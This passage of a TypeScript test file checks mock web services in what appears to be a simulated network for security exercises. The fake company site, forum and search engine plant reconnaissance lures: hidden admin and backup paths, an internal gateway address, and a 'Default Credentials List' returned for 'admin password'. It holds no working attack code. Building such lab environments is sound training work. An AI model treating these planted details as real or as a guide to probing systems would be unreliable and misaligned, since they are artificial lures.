        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('Corp Inc.');
    });

    it('serves subpages', () => {
        const text = responseText(handler, makeRequest('GET', '/about'));
        expect(text).toContain('About Us');
    });

    it('serves robots.txt', () => {
        const text = responseText(handler, makeRequest('GET', '/robots.txt'));
        expect(text).toContain('Disallow: /admin');
        expect(text).toContain('Disallow: /backup');
    });

    it('returns 404 for missing pages', () => {
        expect(responseStatus(handler, makeRequest('GET', '/nonexistent'))).toBe(404);
    });
});

describe('Forum', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'forum.corp.local')!;
    });

    it('serves forum index', () => {
        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('Corp Forum');
        expect(text).toContain('VPN Issues');
    });

    it('serves thread page', () => {
        const text = responseText(handler, makeRequest('GET', '/thread/1'));
        expect(text).toContain('backup gateway');
        expect(text).toContain('10.0.3.1');
    });
});

describe('Static content override', () => {
    it('static content takes priority over handler logic', () => {
        const spec: VariantInternetSpec = {
            services: [{
                domain: 'search.test',
                type: 'search',
                staticContent: {
                    '/custom': '<html>Custom page</html>',
                },
                searchConfig: { results: {} },
            }],
            dnsRecords: [],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'search.test')!;

        const text = responseText(handler, makeRequest('GET', '/custom'));
        expect(text).toBe('<html>Custom page</html>');
    });
});

describe('extractQueryParam (via search)', () => {
    it('handles encoded query parameters', () => {
        const spec: VariantInternetSpec = {
            services: [makeSearchService()],
            dnsRecords: [],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'search.variant.net')!;

        // URL-encoded space
        const text = responseText(handler, makeRequest('GET', '/search?q=admin%20password'));
        expect(text).toContain('Default Credentials List');
    });
});
